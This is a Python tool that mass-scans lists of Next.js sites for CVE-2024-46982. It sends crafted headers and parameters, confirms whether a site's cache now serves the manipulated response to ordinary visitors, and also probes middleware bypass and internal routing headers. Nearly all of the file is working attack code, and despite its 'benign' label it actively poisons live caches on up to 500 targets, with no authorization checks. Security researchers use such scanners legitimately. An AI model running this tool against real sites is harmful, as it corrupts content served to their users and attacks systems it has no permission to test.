#!/usr/bin/env python3
"""
nextjs_poison.py — Next.js Internal Cache Poisoning Scanner (CVE-2024-46982)
Detects vulnerable Next.js instances and tests for SSR->SSG cache poisoning
via __nextDataReq + x-now-route-matches, purpose:prefetch, middleware bypass,
x-middleware-prefetch, __nextLocale, _rsc, and x-invoke-path/query headers.

Safety: Uses benign content only. Checks IF the cache accepts manipulated
responses — never injects malicious payloads. Cache entries expire naturally.

Severity:
  P1:CACHE_POISON:CRIT   — cache confirmed poisoned (clean request returns poisoned content)
  P2:CACHE_POISON:HIGH   — SSR data endpoint accessible, poisoning conditions met
  P3:CACHE_POISON:MEDIUM — vulnerable version detected, SSR data not accessible

Usage:
  python3 nextjs_poison.py -i targets.txt -o findings.txt -t 10
  python3 nextjs_poison.py -i targets.txt -o /dev/stdout --dry-run
"""

import argparse
import re
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DEFAULT_UA = "noleak"
TIMEOUT = 10

# Common SSR pages to test for cache poisoning
SSR_CANDIDATE_PATHS = [
    "/", "/login", "/dashboard", "/account", "/profile",
    "/settings", "/search", "/about", "/pricing", "/home",
]

# Patched versions: >= 14.2.10 for 14.x, >= 15.0.0 for 15.x
PATCHED_14 = (14, 2, 10)
PATCHED_15 = (15, 0, 0)


def parse_version(version_str):
    """Parse a semver string into a tuple of ints."""
    match = re.search(r"(\d+)\.(\d+)\.(\d+)", version_str)
    if match:
        return tuple(int(x) for x in match.groups())
    return None


def is_patched(version_tuple):
    """Check if the version is patched against CVE-2024-46982."""
    if not version_tuple:
        return False
    major = version_tuple[0]
    if major == 14:
        return version_tuple >= PATCHED_14
    if major >= 15:
        return version_tuple >= PATCHED_15
    # 13.x is affected, no backport patch
    if major == 13:
        return False
    # Versions < 13 are not affected by this specific CVE
    return True


class NextJSScanner:
    """Next.js cache poisoning scanner targeting CVE-2024-46982."""

    def __init__(self, user_agent=DEFAULT_UA, timeout=TIMEOUT, dry_run=False):
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": user_agent})
        self.session.verify = False
        self.timeout = timeout
        self.dry_run = dry_run

    def _get(self, url, headers=None, allow_redirects=True):
        """Safe GET request returning (status, headers_dict, body)."""
        try:
            resp = self.session.get(
                url, headers=headers or {},
                allow_redirects=allow_redirects, timeout=self.timeout,
            )
            return resp.status_code, dict(resp.headers), resp.text
        except requests.RequestException:
            return None, {}, ""

    # ── Phase 1: Next.js Detection & Version Fingerprinting ──

    def detect_nextjs(self, base_url):
        """Detect Next.js and attempt version fingerprinting.
        Returns (is_nextjs: bool, version: tuple|None, details: str).
        """
        status, headers, body = self._get(base_url)
        if status is None:
            return False, None, "unreachable"

        is_next = False
        version = None
        details = []

        # x-powered-by: Next.js
        powered_by = headers.get("x-powered-by", "")
        if "Next.js" in powered_by:
            is_next = True
            details.append(f"x-powered-by={powered_by}")

        # __NEXT_DATA__ script tag in HTML
        if "__NEXT_DATA__" in body:
            is_next = True
            details.append("__NEXT_DATA__ present")
            bid_match = re.search(r'"buildId"\s*:\s*"([^"]+)"', body)
            if bid_match:
                details.append(f"buildId={bid_match.group(1)}")

        if not is_next:
            return False, None, "not Next.js"

        # Try /_next/static/chunks/webpack-*.js for version in source
        webpack_match = re.search(
            r'/_next/static/chunks/webpack-([a-f0-9]+)\.js', body
        )
        if webpack_match:
            wp_url = f"{base_url}/_next/static/chunks/webpack-{webpack_match.group(1)}.js"
            ws, _, wb = self._get(wp_url)
            if ws == 200:
                ver_match = re.search(r'Next\.js\s+v?(\d+\.\d+\.\d+)', wb)
                if ver_match:
                    version = parse_version(ver_match.group(1))
                    details.append(f"version={ver_match.group(1)}")

        # Try /_next/build-manifest.json
        bm_status, _, bm_body = self._get(f"{base_url}/_next/build-manifest.json")
        if bm_status == 200 and bm_body.strip().startswith("{"):
            details.append("build-manifest.json accessible")

        # Try /next.config.js (rarely accessible)
        if not version:
            nc_status, _, nc_body = self._get(f"{base_url}/next.config.js")
            if nc_status == 200 and ("module.exports" in nc_body or "nextConfig" in nc_body):
                details.append("next.config.js accessible")

        return True, version, " | ".join(details)

    # ── Phase 2: SSR Data Endpoint Probe ──

    def probe_ssr_data(self, url):
        """Test if SSR data endpoint is accessible via __nextDataReq.
        Returns (accessible: bool, json_body: str).
        """
        sep = "&" if "?" in url else "?"
        data_url = f"{url}{sep}__nextDataReq=1"

        status, headers, body = self._get(data_url, headers={
            "x-now-route-matches": "1",
            "x-nextjs-data": "1",
        })
        if status is None:
            return False, ""

        content_type = headers.get("content-type", "")

        # JSON with SSR markers
        if status == 200:
            ssr_markers = ['"pageProps"', '"__N_SSP"', '"__N_SSG"', '"props"']
            if "application/json" in content_type and any(m in body for m in ssr_markers):
                return True, body
            # Some versions return JSON without proper content-type
            if body.strip().startswith("{") and any(m in body for m in ssr_markers):
                return True, body

        return False, ""

    # ── Phase 3: Cache Poisoning Test (CVE-2024-46982) ──

    def test_cache_poison(self, url):
        """Test cache poisoning via SSR->SSG confusion.
        Sends purpose:prefetch + x-now-route-matches to trick Next.js
        into treating an SSR page as SSG and caching the response.
        """
        findings = []

        # Step a: Baseline — normal GET
        base_status, base_headers, base_body = self._get(url)
        if base_status is None or base_status not in (200, 301, 302, 304):
            return findings
        if "__NEXT_DATA__" not in base_body:
            return findings

        base_length = len(base_body)
        base_cache = base_headers.get("x-nextjs-cache", "")

        # Step b: SSR data probe
        ssr_accessible, ssr_body = self.probe_ssr_data(url)

        # Step c: Cache poisoning attempt — trick SSR into caching as SSG
        parsed_path = urlparse(url).path or "/"
        poison_headers = {
            "x-now-route-matches": "1",
            "x-matched-path": parsed_path,
            "purpose": "prefetch",
        }
        poison_status, poison_resp_hdrs, poison_body = self._get(
            url, headers=poison_headers
        )
        if poison_status is None:
            return findings

        poison_length = len(poison_body)
        poison_cache = poison_resp_hdrs.get("x-nextjs-cache", "")

        # Step d: Verification — wait then send clean GET
        time.sleep(2)
        verify_status, verify_headers, verify_body = self._get(url)
        if verify_status is None:
            return findings

        verify_length = len(verify_body)
        verify_cache = verify_headers.get("x-nextjs-cache", "")

        # P1 CRIT: Cache confirmed poisoned — clean request returns poisoned content
        if (poison_length != base_length
                and verify_length == poison_length
                and verify_body == poison_body
                and verify_body != base_body):
            findings.append(
                f"[P1:CACHE_POISON:CRIT] CACHE_POISONED {url} | "
                f"baseline={base_length}B, poisoned={poison_length}B, "
                f"verify={verify_length}B (matches poison) | "
                f"cache: base={base_cache}, poison={poison_cache}, verify={verify_cache}"
            )
            return findings

        # Also check if clean GET now returns JSON instead of HTML
        if (verify_body.strip().startswith("{")
                and "__NEXT_DATA__" not in verify_body
                and "__NEXT_DATA__" in base_body):
            findings.append(
                f"[P1:CACHE_POISON:CRIT] CACHE_POISONED_JSON {url} | "
                f"clean GET returns JSON instead of HTML after poison attempt | "
                f"cache: verify={verify_cache}"
            )
            return findings

        # P2 HIGH: SSR data accessible + cache conditions met but unconfirmed
        if ssr_accessible:
            preview = ssr_body[:200].replace("\n", " ").replace("\r", "")
            findings.append(
                f"[P2:CACHE_POISON:HIGH] SSR_DATA_ACCESSIBLE {url} | "
                f"__nextDataReq returns SSR JSON ({len(ssr_body)}B) | "
                f"preview: {preview}"
            )
            # Check if poison attempt changed cache behavior
            if poison_cache and poison_cache != base_cache:
                findings.append(
                    f"[P2:CACHE_POISON:HIGH] CACHE_STATE_CHANGED {url} | "
                    f"x-nextjs-cache changed: '{base_cache}' -> '{poison_cache}' | "
                    f"poisoning conditions likely met"
                )

        return findings

    # ── Phase 4: Additional Attack Vectors ──

    def test_middleware_bypass(self, url):
        """Test middleware bypass via x-middleware-invoke header."""
        findings = []
        norm_status, _, norm_body = self._get(url)
        if norm_status is None:
            return findings

        mid_status, _, mid_body = self._get(url, headers={
            "x-middleware-invoke": "1",
        })
        if mid_status is None:
            return findings

        if mid_status != norm_status:
            findings.append(
                f"[P2:CACHE_POISON:HIGH] MIDDLEWARE_BYPASS {url} | "
                f"normal={norm_status}, with x-middleware-invoke={mid_status} | "
                f"middleware processing altered"
            )
        elif mid_body != norm_body and abs(len(mid_body) - len(norm_body)) > 100:
            findings.append(
                f"[P3:CACHE_POISON:MEDIUM] MIDDLEWARE_RESPONSE_DIFF {url} | "
                f"body differs by {abs(len(mid_body) - len(norm_body))}B with "
                f"x-middleware-invoke | manual review needed"
            )
        return findings

    def test_middleware_prefetch(self, url):
        """Test x-middleware-prefetch cache manipulation."""
        findings = []
        norm_status, _, norm_body = self._get(url)
        if norm_status is None:
            return findings

        pf_status, _, pf_body = self._get(url, headers={
            "x-middleware-prefetch": "1",
        })
        if pf_status is None:
            return findings

        # Prefetch may return truncated response that poisons cache
        if pf_status == 200 and pf_body != norm_body:
            if len(pf_body) < len(norm_body) * 0.5 and len(norm_body) > 200:
                findings.append(
                    f"[P2:CACHE_POISON:HIGH] PREFETCH_CACHE_POISON {url} | "
                    f"x-middleware-prefetch returns truncated response "
                    f"({len(pf_body)}B vs {len(norm_body)}B) | "
                    f"may poison cache with incomplete content"
                )
        return findings

    def test_rsc_cache(self, url):
        """Test React Server Components _rsc parameter cache manipulation."""
        findings = []
        norm_status, _, norm_body = self._get(url)
        if norm_status is None:
            return findings

        sep = "&" if "?" in url else "?"
        rsc_url = f"{url}{sep}_rsc=1"
        rsc_status, rsc_headers, rsc_body = self._get(rsc_url)
        if rsc_status is None:
            return findings

        rsc_ct = rsc_headers.get("content-type", "")

        # RSC flight data has distinct format (0:, 1:, 2: prefixed lines)
        if rsc_status == 200 and rsc_body != norm_body:
            is_flight = ("text/x-component" in rsc_ct
                         or rsc_body.lstrip()[:2] in ("0:", "1:", "2:"))
            if is_flight:
                findings.append(
                    f"[P3:CACHE_POISON:MEDIUM] RSC_ENDPOINT_ACCESSIBLE {url} | "
                    f"_rsc=1 returns flight data ({len(rsc_body)}B, ct={rsc_ct}) | "
                    f"test if RSC response poisons HTML cache"
                )
        return findings

    def test_locale_poison(self, url):
        """Test __nextLocale parameter for locale-based cache poisoning."""
        findings = []
        norm_status, _, norm_body = self._get(url)
        if norm_status is None:
            return findings

        sep = "&" if "?" in url else "?"
        locale_url = f"{url}{sep}__nextLocale=xx-POISON"
        loc_status, _, loc_body = self._get(locale_url)
        if loc_status is None:
            return findings

        if loc_status == 200 and loc_body != norm_body:
            time.sleep(1)
            verify_status, _, verify_body = self._get(url)
            if verify_status and verify_body != norm_body and verify_body == loc_body:
                findings.append(
                    f"[P2:CACHE_POISON:HIGH] LOCALE_CACHE_POISONED {url} | "
                    f"__nextLocale=xx-POISON poisoned the cache | "
                    f"clean request returns poisoned locale content"
                )
        return findings

    def test_invoke_headers(self, url):
        """Test x-invoke-path / x-invoke-query header manipulation."""
        findings = []
        norm_status, _, norm_body = self._get(url)
        if norm_status is None:
            return findings

        invoke_status, _, invoke_body = self._get(url, headers={
            "x-invoke-path": "/api/config",
            "x-invoke-query": '{"debug":"true"}',
        })
        if invoke_status is None:
            return findings

        if invoke_status == 200 and invoke_body != norm_body:
            diff = abs(len(invoke_body) - len(norm_body))
            if diff > 200:
                findings.append(
                    f"[P2:CACHE_POISON:HIGH] INVOKE_PATH_REROUTE {url} | "
                    f"x-invoke-path=/api/config changed response "
                    f"({len(norm_body)}B -> {len(invoke_body)}B) | "
                    f"internal routing manipulated"
                )
        return findings

    # ── Scan Orchestration ──

    def scan_target(self, base_url):
        """Run full cache poisoning scan on a Next.js target."""
        all_findings = []

        # Phase 1: Detect and fingerprint
        is_next, version, details = self.detect_nextjs(base_url)
        if not is_next:
            return all_findings

        ver_str = ".".join(str(x) for x in version) if version else "unknown"

        # Skip patched versions
        if version and is_patched(version):
            print(f"  [SKIP] {base_url} — Next.js {ver_str} is patched")
            return all_findings

        print(f"  [NEXT] {base_url} — v{ver_str} | {details}")

        # Discover SSR pages worth testing
        test_urls = [base_url]
        for path in SSR_CANDIDATE_PATHS:
            if path == "/":
                continue
            candidate = f"{base_url}{path}"
            status, _, body = self._get(candidate, allow_redirects=False)
            if status and status == 200 and "__NEXT_DATA__" in body:
                test_urls.append(candidate)

        test_urls = list(dict.fromkeys(test_urls))
        print(f"  [INFO] Testing {len(test_urls)} SSR page(s) on {base_url}")

        # Phase 2-4: Run all tests on each SSR page
        for url in test_urls:
            if self.dry_run:
                print(f"  [DRY-RUN] Would test: {url}")
                continue

            all_findings.extend(self.test_cache_poison(url))
            all_findings.extend(self.test_middleware_bypass(url))
            all_findings.extend(self.test_middleware_prefetch(url))
            all_findings.extend(self.test_rsc_cache(url))
            all_findings.extend(self.test_locale_poison(url))
            all_findings.extend(self.test_invoke_headers(url))

        # Append version context to all findings
        if all_findings:
            ver_tag = f" | nextjs_version={ver_str}"
            all_findings = [f + ver_tag for f in all_findings]

        return all_findings


def main():
    parser = argparse.ArgumentParser(
        description="Next.js Internal Cache Poisoning Scanner (CVE-2024-46982)"
    )
    parser.add_argument("-i", "--input", required=True,
                        help="Input file with base URLs (Next.js targets)")
    parser.add_argument("-o", "--output", required=False,
                        help="Output file for findings")
    parser.add_argument("-t", "--threads", type=int, default=10,
                        help="Thread count (default: 10)")
    parser.add_argument("--timeout", type=int, default=10,
                        help="Request timeout in seconds (default: 10)")
    parser.add_argument("--user-agent", default=DEFAULT_UA,
                        help="User-Agent string (default: noleak)")
    parser.add_argument("--max-urls", type=int, default=500,
                        help="Max base URLs to test (default: 500)")
    parser.add_argument("--dry-run", action="store_true",
                        help="Show targets without testing")
    args = parser.parse_args()

    try:
        with open(args.input, "r") as f:
            urls = [line.strip() for line in f
                    if line.strip() and line.strip().startswith("http")]
    except (IOError, PermissionError) as e:
        print(f"[ERROR] Cannot read input: {e}", file=sys.stderr)
        sys.exit(1)

    if not urls:
        print("[*] No URLs to test")
        return

    # Deduplicate to base URLs
    seen = set()
    base_urls = []
    for url in urls:
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        if base not in seen:
            seen.add(base)
            base_urls.append(base)
        if len(base_urls) >= args.max_urls:
            break

    print(f"[*] Loaded {len(urls)} URLs, normalized to {len(base_urls)} unique Next.js targets")

    scanner = NextJSScanner(
        user_agent=args.user_agent,
        timeout=args.timeout,
        dry_run=args.dry_run,
    )

    if args.dry_run:
        for url in base_urls:
            scanner.scan_target(url)
        return

    lock = threading.Lock()
    completed = [0]
    all_findings = []

    def process_target(url):
        findings = scanner.scan_target(url)
        with lock:
            completed[0] += 1
            if completed[0] % 5 == 0 or findings:
                print(f"[*] Progress: {completed[0]}/{len(base_urls)} targets tested")
            for f in findings:
                print(f"  {f}")
                all_findings.append(f)

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {executor.submit(process_target, url): url for url in base_urls}
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"  [ERROR] {futures[future]}: {e}")

    if args.output:
        try:
            with open(args.output, "w") as f:
                for line in all_findings:
                    f.write(line + "\n")
            if all_findings:
                print(f"\n[*] Wrote {len(all_findings)} finding(s) to {args.output}")
        except (IOError, PermissionError) as e:
            print(f"[ERROR] Cannot write output: {e}", file=sys.stderr)

    print(f"\n[*] Scan complete: {len(base_urls)} targets, {len(all_findings)} findings")


if __name__ == "__main__":
    main()
